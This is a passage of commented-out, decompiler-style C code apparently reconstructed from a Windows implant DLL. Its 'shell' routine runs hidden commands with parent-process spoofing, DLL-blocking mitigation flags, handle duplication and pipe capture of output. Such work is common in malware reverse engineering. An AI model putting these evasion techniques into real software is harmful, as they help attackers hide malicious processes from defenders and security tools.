//	memset(v9, 0, v8);
//	if (!(unsigned int)sub_18000F03C(*(LPCCH*)(a2 + 8), (LPWSTR)v9))
//	{
//		sub_18000DC2C(66i64);
//	LABEL_11:
//		free(v9);
//		return 0i64;
//	}
//	if (!WriteProcessMemory(
//		*(HANDLE*)a1,
//		*(LPVOID*)&lpAddress[6],
//		v9,
//		*(unsigned __int16*)lpAddress,
//		&NumberOfBytesWritten))
//	{
//		v10 = GetLastError();
//		sub_18000DB60(65i64, v10);
//		goto LABEL_11;
//	}
//	return 1i64;
//}
//
//__int64 __fastcall sub_18000FAD8(__int64 a1)
//{
//	__int64 v2; // rax
//	unsigned int v3; // edi
//	int v4; // eax
//	HANDLE* v5; // rcx
//	__int64 result; // rax
//	__int64 v7[5]; // [rsp+20h] [rbp-28h] BYREF
//
//	if ((*(_BYTE*)(a1 + 32) & 4) != 0 || !(unsigned int)sub_18000C71C(*(char**)a1))
//		return sub_18000F830(a1);
//	v2 = v7[0];
//	*(_DWORD*)(a1 + 32) |= 4u;
//	*(_QWORD*)a1 = v2;
//	v3 = sub_18000F830(a1);
//	v4 = sub_18000F934(*(_QWORD*)(a1 + 24), v7);
//	v5 = *(HANDLE**)(a1 + 24);
//	if (v4)
//	{
//		ResumeThread(v5[1]);
//		result = v3;
//	}
//	else
//	{
//		TerminateProcess(*v5, 0);
//		result = 0i64;
//	}
//	return result;
//}
//__int64 __fastcall sub_180014F80(DWORD dwAttributeCount)
//{
//	HANDLE v2; // rax
//	struct _PROC_THREAD_ATTRIBUTE_LIST* v3; // rax
//	__int64 v4; // rbx
//	__int64 result; // rax
//	ULONG_PTR Size; // [rsp+38h] [rbp+10h] BYREF
//
//	Size = 0i64;
//	InitializeProcThreadAttributeList(0i64, dwAttributeCount, 0, &Size);
//	v2 = GetProcessHeap();
//	v3 = (struct _PROC_THREAD_ATTRIBUTE_LIST*)HeapAlloc(v2, 0, Size);
//	v4 = (__int64)v3;
//	if (v3 && InitializeProcThreadAttributeList(v3, dwAttributeCount, 0, &Size))
//		result = v4;
//	else
//		result = 0i64;
//	return result;
//}
//__int64 __fastcall sub_18000DB6C(unsigned int a1, unsigned int a2, unsigned int a3)
//{
//	return sub_18000DB74(a1, a2, a3, 0i64);
//}
//BOOL __fastcall sub_18001524C(HANDLE* a1)
//{
//	return CloseHandle(*a1);
//}
//__int64 __fastcall sub_180015258(PVOID lpValue, DWORD dwProcessId, LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, __int64 a4)
//{
//	HANDLE v8; // rax
//	void* v9; // rsi
//	unsigned int v10; // eax
//	DWORD v12; // eax
//	void* v13; // rbx
//	HANDLE v14; // rax
//	HANDLE v15; // rax
//	void* v16; // rbx
//	HANDLE v17; // rax
//
//	v8 = OpenProcess(0x1FFFFFu, 0, dwProcessId);
//	v9 = v8;
//	if (!v8)
//	{
//		v10 = GetLastError();
//		sub_18000DB6C(0x22u, dwProcessId, v10);
//		return 0i64;
//	}
//	*(_QWORD*)lpValue = v8;
//	if (!UpdateProcThreadAttribute(lpAttributeList, 0, 0x20000ui64, lpValue, 8ui64, 0i64, 0i64))
//	{
//		v12 = GetLastError();
//		sub_18000DB60(71i64, v12);
//		CloseHandle(v9);
//		return 0i64;
//	}
//	v13 = *(void**)(a4 + 88);
//	if (v13 && *(_QWORD*)(a4 + 96) && v13 == *(void**)(a4 + 96))
//	{
//		v14 = GetCurrentProcess();
//		DuplicateHandle(v14, v13, v9, (LPHANDLE)(a4 + 88), 0, 1, 3u);
//		*(_QWORD*)(a4 + 96) = *(_QWORD*)(a4 + 88);
//	}
//	else
//	{
//		if (v13)
//		{
//			v15 = GetCurrentProcess();
//			DuplicateHandle(v15, v13, v9, (LPHANDLE)(a4 + 88), 0, 1, 3u);
//		}
//		v16 = *(void**)(a4 + 96);
//		if (v16)
//		{
//			v17 = GetCurrentProcess();
//			DuplicateHandle(v17, v16, v9, (LPHANDLE)(a4 + 96), 0, 1, 3u);
//		}
//	}
//	return 1i64;
//}
//
//_QWORD* __fastcall sub_18001522C(_QWORD* a1)
//{
//	*a1 = -1i64;
//	a1[3] = sub_180015258;
//	a1[4] = sub_18001524C;
//	return a1;
//}
//__int64 __fastcall sub_1800150F8(__int64 a1, __int64 a2, struct _PROC_THREAD_ATTRIBUTE_LIST* a3)
//{
//	DWORD v4; // eax
//	__int64 result; // rax
//
//	*(_QWORD*)(a1 + 8) = 0x100000000000i64;
//	if (UpdateProcThreadAttribute(a3, 0, 0x20007ui64, (PVOID)(a1 + 8), 8ui64, 0i64, 0i64))
//	{
//		if (&SetErrorMode)
//			*(_DWORD*)(a1 + 16) = SetErrorMode(0x8003u);
//		result = 1i64;
//	}
//	else
//	{
//		v4 = GetLastError();
//		sub_18000DB60(71i64, v4);
//		result = 0i64;
//	}
//	return result;
//}
//UINT __fastcall sub_1800150DC(__int64 a1)
//{
//	UINT result; // eax
//
//	if (&SetErrorMode)
//		result = SetErrorMode(*(_DWORD*)(a1 + 16));
//	return result;
//}
//
//__int64 __fastcall sub_1800150C0(__int64 a1)
//{
//	*(_QWORD*)(a1 + 24) = &sub_1800150F8;
//	*(_QWORD*)(a1 + 32) = sub_1800150DC;
//	return a1;
//}
//
//BOOL __fastcall sub_180014F54(struct _PROC_THREAD_ATTRIBUTE_LIST* a1)
//{
//	HANDLE v2; // rax
//
//	DeleteProcThreadAttributeList(a1);
//	v2 = GetProcessHeap();
//	return HeapFree(v2, 0, a1);
//}
//
//__int64 __fastcall sub_180014D7C(__int64 a1, unsigned int a2)
//{
//	unsigned int v4; // er14
//	DWORD v5; // eax
//	__int64 v7; // rsi
//	__int64* v8; // rax
//	__int64* v9; // rax
//	unsigned int(__fastcall * v10)(QWORD, _QWORD, _QWORD, _QWORD); // r10
//	__int64* v11; // rcx
//	__int64 v12; // rax
//	__int64 v13; // [rsp+28h] [rbp-E0h] BYREF
//	__int64 v14; // [rsp+30h] [rbp-D8h]
//	__int64 v15; // [rsp+38h] [rbp-D0h]
//	unsigned int(__fastcall * v16)(_QWORD, _QWORD, _QWORD, _QWORD); // [rsp+40h] [rbp-C8h]
//	void(__fastcall * v17)(__int64*); // [rsp+48h] [rbp-C0h]
//	__int64 v18[3]; // [rsp+50h] [rbp-B8h] BYREF
//	unsigned int(__fastcall * v19)(__int64*, _QWORD, __int64, _QWORD, __int64, __int64, __int64); // [rsp+68h] [rbp-A0h]
//	void(__fastcall * v20)(__int64*); // [rsp+70h] [rbp-98h]
//	__int64 v21[14]; // [rsp+78h] [rbp-90h] BYREF
//	char v22[48]; // [rsp+E8h] [rbp-20h] BYREF
//
//	v4 = 0;
//	v5 = sub_180014FEC(a2);
//	if (!v5)
//		return sub_18000FAD8(a1);
//	v7 = sub_180014F80(v5);
//	v8 = (__int64*)sub_18001522C(v22);
//	v18[0] = *v8;
//	v18[1] = v8[1];
//	v18[2] = v8[2];
//	v19 = (unsigned int(__fastcall*)(__int64*, _QWORD, __int64, _QWORD, __int64, __int64, __int64))v8[3];
//	v20 = (void(__fastcall*)(__int64*))v8[4];
//	v9 = (__int64*)sub_1800150C0(v22);
//	v13 = *v9;
//	v14 = v9[1];
//	v15 = v9[2];
//	v10 = (unsigned int(__fastcall*)(_QWORD, _QWORD, _QWORD, _QWORD))v9[3];
//	v16 = v10;
//	v17 = (void(__fastcall*)(__int64*))v9[4];
//	if (!a2)
//		goto LABEL_6;
//	if (v19(v18, a2, v7, *(_QWORD*)(a1 + 16), v13, v14, v15))
//	{
//		v10 = v16;
//	LABEL_6:
//		if (dword_18003F410 != 1 || v10(&v13, a2, v7, *(_QWORD*)(a1 + 16)))
//		{
//			v11 = *(__int64**)(a1 + 16);
//			v21[0] = *v11;
//			v21[1] = v11[1];
//			v21[2] = v11[2];
//			v21[3] = v11[3];
//			v21[4] = v11[4];
//			v21[5] = v11[5];
//			v21[6] = v11[6];
//			v21[7] = v11[7];
//			v21[8] = v11[8];
//			v21[9] = v11[9];
//			v21[10] = v11[10];
//			v21[11] = v11[11];
//			v12 = v11[12];
//			*(_DWORD*)(a1 + 32) |= 0x80000u;
//			v21[12] = v12;
//			LODWORD(v21[0]) = 112;
//			v21[13] = v7;
//			*(_QWORD*)(a1 + 16) = v21;
//			v4 = sub_18000FAD8(a1);
//			if (a2)
//				v20(v18);
//			if (dword_18003F410 == 1)
//				v17(&v13);
//		}
//	}
//	sub_180014F54(v7);
//	return v4;
//}
//
//__int64 __fastcall sub_180015010(__int64 a1, int a2, __int64 a3, __int64 a4, unsigned int a5, unsigned int a6, unsigned int a7)
//{
//	__int64 v12[7]; // [rsp+20h] [rbp-38h] BYREF
//
//	memset(v12, 0, 0x28ui64);
//	v12[4] = __PAIR64__(a6, a5);
//	v12[0] = a1;
//	LODWORD(v12[1]) = a2;
//	v12[2] = a3;
//	v12[3] = a4;
//	return sub_180014D7C(v12, a7);
//}
//
//__int64 __fastcall sub_1800151C0(int a1, int a2, int a3, int a4, int a5, int a6)
//{
//	return sub_180015010(a1, a2, a3, a4, a5, a6, dword_18003F414);
//}
//unsigned __int64 __fastcall sub_18001271C(_DWORD* a1)
//{
//	int v1; // eax
//	_QWORD* v2; // rdx
//	unsigned __int64 result; // rax
//
//	v1 = dword_18003E4D8;
//	v2 = qword_18003E4D0;
//	*a1 = dword_18003E4D8;
//	result = (unsigned int)(v1 + 1);
//	dword_18003E4D8 = result;
//	if (v2)
//	{
//		do
//		{
//			result = (unsigned __int64)v2;
//			v2 = (_QWORD*)v2[6];
//		} while (v2);
//		*(_QWORD*)(result + 48) = a1;
//	}
//	else
//	{
//		qword_18003E4D0 = a1;
//	}
//	return result;
//}
//
//void* __fastcall sub_180012854(_QWORD* a1, __int64 a2, __int64 a3, const char* a4)
//{
//	void* v8; // rbp
//	__int64 v9; // r10
//	int v10; // eax
//
//	v8 = malloc(0x88ui64);
//	*((_QWORD*)v8 + 1) = *a1;
//	*((_QWORD*)v8 + 2) = a1[1];
//	v9 = a1[2];
//	*((_QWORD*)v8 + 6) = 0i64;
//	*((_DWORD*)v8 + 14) = 0;
//	*((_QWORD*)v8 + 4) = a2;
//	*((_QWORD*)v8 + 5) = a3;
//	*((_QWORD*)v8 + 3) = v9;
//	v10 = *((_DWORD*)a1 + 4);
//	*((_DWORD*)v8 + 16) = 0;
//	*((_WORD*)v8 + 34) = 0;
//	*((_DWORD*)v8 + 15) = v10;
//	snprintf((char* const)v8 + 70, 0x40ui64, "%s", a4);
//	sub_18001271C(v8);
//	return v8;
//}
//
//__int64 __fastcall sub_180012AC4(__int64 a1, __int64 a2, __int64 a3)
//{
//	__int64 v3; // xmm1_8
//	__int64 result; // rax
//	__int128 v5; // [rsp+20h] [rbp-28h] BYREF
//	__int64 v6; // [rsp+30h] [rbp-18h]
//
//	v3 = *(_QWORD*)(a1 + 16);
//	v5 = *(_OWORD*)a1;
//	v6 = v3;
//	result = ((__int64(__fastcall*)(__int128*, __int64, __int64, const char*))sub_180012854)(&v5, a2, a3, "process");
//	*(_DWORD*)(result + 64) = 30;
//	return result;
//}
//
//__int64 __fastcall sub_18000EF38(int a1, int a2)
//{
//	__int64 result; // rax
//	HANDLE hHandle[2]; // [rsp+38h] [rbp-79h] BYREF
//	__int64 v6; // [rsp+48h] [rbp-69h]
//	HANDLE hReadPipe; // [rsp+50h] [rbp-61h] BYREF
//	struct _SECURITY_ATTRIBUTES PipeAttributes; // [rsp+58h] [rbp-59h] BYREF
//	unsigned long long  v9[2]; // [rsp+78h] [rbp-39h] BYREF
//	__int64 v10; // [rsp+88h] [rbp-29h]
//	struct _STARTUPINFOA StartupInfo; // [rsp+98h] [rbp-19h] BYREF
//	HANDLE hWritePipe; // [rsp+130h] [rbp+7Fh] BYREF
//
//	memset(&StartupInfo, 0, sizeof(StartupInfo));
//	StartupInfo.cb = 104;
//	hHandle[0] = 0i64;
//	hHandle[1] = 0i64;
//	v6 = 0i64;
//	PipeAttributes.nLength = 24;
//	PipeAttributes.lpSecurityDescriptor = 0i64;
//	PipeAttributes.bInheritHandle = 1;
//	CreatePipe(&hReadPipe, &hWritePipe, &PipeAttributes, 0x100000u);
//	GetStartupInfoA(&StartupInfo);
//	StartupInfo.hStdOutput = hWritePipe;
//	StartupInfo.hStdError = hWritePipe;
//	StartupInfo.dwFlags = 257;
//	StartupInfo.wShowWindow = 0;
//	StartupInfo.hStdInput = 0i64;
//	result = sub_1800151C0(a1, a2, (int)&StartupInfo, (int)hHandle, 16, 0);
//	if ((DWORD)result)
//	{
//		WaitForSingleObject(hHandle[0], 0x2710u);
//		v9 = *(_OWORD*)hHandle;
//		v10 = v6;
//		result = sub_180012AC4((__int64)&v9, (__int64)hReadPipe, (__int64)hWritePipe);
//	}
//	return result;
//}
//FARPROC __fastcall sub_1800109C0(__int64 a1)
//{
//	HMODULE v2; // rax
//	FARPROC result; // rax
//
//	v2 = GetModuleHandleA("kernel32");
//	result = GetProcAddress(v2, "Wow64RevertWow64FsRedirection");
//	if (result)
//		result = (FARPROC)((__int64(__fastcall*)(__int64))result)(a1);
//	return result;
//}
//void* __fastcall sub_180013DC4(__int64 a1)
//{
//	return memset(*(void**)a1, 0, *(int*)(a1 + 20));
//}
//void __fastcall sub_180013E0C(void* Block)
//{
//	sub_180013DC4();
//	free(*(void**)Block);
//	free(Block);
//}
//void shell(void* a1, int a2)
//{
//	struc_1* v4; // r12
//	void* v5; // rbp
//	void* v6; // rsi
//	void* v7; // r14
//	char* v8; // r15
//	unsigned __int16 v9; // bx
//	__int64 v10; // rax
//	__int64 v11; // rax
//	struc_1 v13; // [rsp+20h] [rbp-48h] BYREF
//	DWORD_PTR v14; // [rsp+80h] [rbp+18h] BYREF
//
//	v4 = (struc_1*)init_struc1_malloc_Memory(0x8000);
//	v5 = (struc_1*)get_ptr_struc1_index2_OffsetN(v4, 0x2000);
//	v6 = (void*)get_ptr_struc1_index2_OffsetN(v4, 0x2000);
//	v7 = (struc_1*)get_ptr_struc1_index2_OffsetN(v4, 0x2000);
//	v8 = (char*)get_ptr_struc1_index2_OffsetN(v4, 0x2000);
//	init_struc1((struc_1*)&v13, a1, a2);
//	copy_struc_1_Nsize_src((struc_1*)v5 , &v13, 0x2000i64);
//	copy_struc_1_Nsize_src((struc_1*)v7 , &v13, 0x2000i64);
//	v9 = get_short_struc1_index2((struc_1*)&v13);
//	//sub_180010904(v5, v6, 0x2000ui64);
//	env_extend((LPCSTR)v5, v6, 0x2000);
//	strncat_s(v8, 0x2000ui64, (const char*)v6, 0x2000ui64);
//	strncat_s(v8, 0x2000ui64, (const char*)v7, 0x2000ui64);
//	if ((v9 & 1) != 0)
//	{
//		sub_180010988(&v14);
//		v10 = -1i64;
//		do
//			++v10;
//		while (v8[v10]);
//		sub_18000EF38(v8, (unsigned int)(v10 + 1), v9);
//		sub_1800109C0(v14);
//	}
//	else
//	{
//		v11 = -1i64;
//		do
//			++v11;
//		while (v8[v11]);
//		sub_18000EF38(v8, (unsigned int)(v11 + 1), v9);
//	}
//	return sub_180013E0C(v4);
//}
